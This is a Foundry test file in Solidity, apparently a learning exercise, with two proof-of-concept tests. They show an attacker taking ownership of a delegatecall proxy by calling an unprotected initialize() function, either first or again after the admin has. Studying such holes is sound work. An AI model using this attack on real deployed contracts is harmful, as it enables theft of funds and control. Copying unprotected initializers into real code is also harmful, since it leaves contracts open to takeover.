// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

import {SimpleProxy} from "../../src/upgradeable-proxy/SimpleProxy.sol";
import {ImplementationV1} from "../../src/upgradeable-proxy/ImplementationV1.sol";

/// @title ProxyPoC
/// @notice Day 1 PoC: an unprotected `initialize()` behind a delegatecall proxy lets
///         an attacker seize ownership of the proxy's storage.
contract ProxyPoC is Test {
    address internal admin = makeAddr("admin");
    address internal attacker = makeAddr("attacker");

    uint256 internal constant HIJACKED_VALUE = 1337;

    /// @notice Full PoC: attacker initializes the proxy before the admin and becomes owner.
    function testExploit_UnprotectedInitializeLetsAttackerTakeOwnership() public {
        ImplementationV1 implementation = new ImplementationV1();
        SimpleProxy proxy = new SimpleProxy(address(implementation));

        // Interact with the proxy address; `delegatecall` executes implementation code
        // against the proxy's storage slots.
        ImplementationV1 vault = ImplementationV1(address(proxy));

        assertEq(vault.owner(), address(0), "proxy storage should start uninitialized");

        vm.prank(attacker);
        vault.initialize(attacker);

        assertEq(vault.owner(), attacker, "attacker should become owner via initialize");

        vm.prank(attacker);
        vault.setValue(HIJACKED_VALUE);

        assertEq(vault.value(), HIJACKED_VALUE, "attacker should control owner-only state");
    }

    /// @notice Variant: even after the admin initializes, a public initializer can be replayed.
    function testExploit_AttackerCanReinitializeAndOverwriteOwner() public {
        ImplementationV1 implementation = new ImplementationV1();
        SimpleProxy proxy = new SimpleProxy(address(implementation));
        ImplementationV1 vault = ImplementationV1(address(proxy));

        vm.prank(admin);
        vault.initialize(admin);

        assertEq(vault.owner(), admin);

        vm.prank(admin);
        vault.setValue(100);
        assertEq(vault.value(), 100);

        vm.prank(attacker);
        vault.initialize(attacker);

        assertEq(vault.owner(), attacker, "attacker should overwrite the previous owner");

        vm.prank(admin);
        vm.expectRevert("not owner");
        vault.setValue(200);

        vm.prank(attacker);
        vault.setValue(HIJACKED_VALUE);

        assertEq(vault.value(), HIJACKED_VALUE, "attacker should regain control after re-init");
    }
}
